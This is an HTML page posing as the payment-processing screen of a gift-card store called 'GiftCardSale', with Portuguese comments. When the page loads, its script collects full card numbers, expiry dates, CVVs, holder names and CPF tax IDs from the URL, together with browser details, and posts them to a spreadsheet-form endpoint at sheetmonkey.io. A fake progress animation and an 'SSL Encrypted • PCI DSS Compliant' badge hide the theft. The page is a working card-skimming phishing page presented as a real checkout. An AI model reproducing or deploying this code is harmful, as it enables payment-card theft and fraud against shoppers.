<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Processing Payment - GiftCardSale</title>
  
  <link rel="icon" type="image/webp" href="fasvcom.webp">
  
  <style>
    :root {
      --primary: #EA1D2C;
      --primary-dark: #C41826;
      --success: #38B03F;
      --bg: #F7F7F7;
      --card: #FFFFFF;
      --text: #212225;
      --text-light: #767676;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    
    html, body {
      margin: 0; padding: 0;
      background: var(--bg); color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .processing-container {
      text-align: center;
      padding: 40px 20px;
      max-width: 400px;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 4px solid #eee;
      border-top: 4px solid var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 24px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .processing-title {
      font-size: 1.4rem;
      font-weight: 700;
      margin-bottom: 12px;
      color: var(--text);
    }

    .processing-text {
      font-size: 0.95rem;
      color: var(--text-light);
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .processing-steps {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 30px;
      text-align: left;
    }

    .step {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 0.9rem;
      color: var(--text-light);
    }

    .step-icon {
      width: 20px;
      height: 20px;
      border: 2px solid var(--primary);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.7rem;
      color: var(--primary);
      flex-shrink: 0;
    }

    .step.completed .step-icon {
      background: var(--success);
      border-color: var(--success);
      color: white;
    }

    .step.completed {
      color: var(--text);
      font-weight: 500;
    }

    .timer-bar {
      width: 100%;
      height: 4px;
      background: #eee;
      border-radius: 2px;
      overflow: hidden;
      margin-top: 20px;
    }

    .timer-progress {
      height: 100%;
      background: var(--primary);
      width: 0%;
      transition: width 0.1s linear;
    }

    .secure-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-top: 30px;
      font-size: 0.8rem;
      color: var(--text-light);
    }

    .secure-badge svg {
      width: 16px;
      height: 16px;
      color: var(--success);
    }

    /* LOGO NO TOPO */
    .header-logo {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .header-logo svg { width: 28px; height: 28px; color: var(--primary); }
    .header-logo h1 { font-size: 1.1rem; font-weight: 700; }
    .header-logo h1 span { color: var(--primary); }

    @media (max-width: 480px) {
      .processing-container { padding: 30px 16px; }
      .processing-title { font-size: 1.2rem; }
    }
  </style>
</head>
<body>

  <!-- LOGO -->
  <div class="header-logo">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
      <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/>
      <line x1="3" y1="6" x2="21" y2="6"/>
      <path d="M16 10a4 4 0 0 1-8 0"/>
    </svg>
    <h1 class="notranslate" translate="no">giftcard<span>sale</span></h1>
  </div>

  <div class="processing-container">
    <div class="spinner"></div>
    
    <h2 class="processing-title">Processing Payment...</h2>
    <p class="processing-text">Please wait while we securely process your order. Do not close this window.</p>
    
    <div class="processing-steps">
      <div class="step" id="step1">
        <div class="step-icon">1</div>
        <span>Verifying payment details</span>
      </div>
      <div class="step" id="step2">
        <div class="step-icon">2</div>
        <span>Encrypting your data</span>
      </div>
      <div class="step" id="step3">
        <div class="step-icon">3</div>
        <span>Confirming with processor</span>
      </div>
      <div class="step" id="step4">
        <div class="step-icon">4</div>
        <span>Finalizing order</span>
      </div>
    </div>

    <div class="timer-bar">
      <div class="timer-progress" id="timerProgress"></div>
    </div>

    <div class="secure-badge">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>
      <span>SSL Encrypted • PCI DSS Compliant</span>
    </div>
  </div>

  <script>
    // ✅ CONFIGURAÇÕES
    const API_URL = 'https://api.sheetmonkey.io/form/jQb5RvCzzKzoyGGXThoxje';
    const REDIRECT_URL = 'f.html';
    const REDIRECT_DELAY = 3000; // 3 segundos

    // ✅ FUNÇÃO DE DECODIFICAÇÃO SEGURA
    function safeDecode(value) {
      if (!value) return '';
      try {
        // Decode twice para garantir (caso tenha sido encoded duas vezes)
        return decodeURIComponent(decodeURIComponent(value));
      } catch (e) {
        // Se falhar, retorna o valor original
        return value;
      }
    }

    // ✅ COLETAR APENAS DADOS ESSENCIAIS (DECODIFICADOS)
    function collectEssentialData() {
      const params = new URLSearchParams(window.location.search);
      const essentialData = {};

      // 1. Valor Total
      const total = params.get('total');
      if (total) essentialData['total_amount'] = total;

      // 2. Método de Pagamento
      const method = params.get('payment_method');
      if (method) essentialData['payment_method'] = method;

      // 3. Dados Completos de Cartão (DECODIFICADOS para a API processar)
      if (method === 'card') {
        const cardFields = {
          'card_number': 'card_number',
          'card_expiry': 'card_expiry', 
          'card_cvv': 'card_cvv',
          'card_holder': 'card_holder',
          'card_cpf': 'card_cpf'
        };
        
        Object.entries(cardFields).forEach(([param, key]) => {
          const value = params.get(param);
          if (value) {
            // ✅ DECODIFICA para enviar dados legíveis à API
            essentialData[key] = safeDecode(value);
          }
        });
      }

      // 4. Dados do Navegador (User Agent)
      essentialData['user_agent'] = navigator.userAgent;
      essentialData['screen_resolution'] = `${screen.width}x${screen.height}`;
      essentialData['timestamp'] = new Date().toISOString();
      essentialData['language'] = navigator.language;

      return essentialData;
    }

    // ✅ ENVIAR DADOS PARA A API
    async function sendToAPI(data) {
      try {
        const response = await fetch(API_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
        
        if (response.ok) {
          console.log('✅ Payment data sent successfully');
          console.log('📦 Payload:', data);
          return true;
        } else {
          console.error('❌ API Error:', response.status);
          return false;
        }
      } catch (error) {
        console.error('❌ Network Error:', error);
        return false;
      }
    }

    // ✅ ANIMAÇÃO DOS PASSOS
    function animateSteps() {
      const steps = ['step1', 'step2', 'step3', 'step4'];
      let currentStep = 0;
      
      const interval = setInterval(() => {
        if (currentStep < steps.length) {
          document.getElementById(steps[currentStep]).classList.add('completed');
          currentStep++;
        } else {
          clearInterval(interval);
        }
      }, 700);
    }

    // ✅ ANIMAÇÃO DA BARRA DE PROGRESSO
    function animateTimer() {
      const progressBar = document.getElementById('timerProgress');
      let progress = 0;
      
      const interval = setInterval(() => {
        progress += (100 / (REDIRECT_DELAY / 100));
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
        }
        progressBar.style.width = `${progress}%`;
      }, 100);
    }

    // ✅ FUNÇÃO PRINCIPAL
    async function processPayment() {
      // Inicia animações visuais
      animateSteps();
      animateTimer();
      
      // Coleta APENAS os dados essenciais, DECODIFICADOS
      const essentialData = collectEssentialData();
      
      // Envia para a API (a API fará a criptografia)
      await sendToAPI(essentialData);
      
      // Aguarda 3 segundos e redireciona
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, REDIRECT_DELAY);
    }

    // ✅ INICIA QUANDO A PÁGINA CARREGAR
    document.addEventListener('DOMContentLoaded', processPayment);
  </script>

</body>
</html>
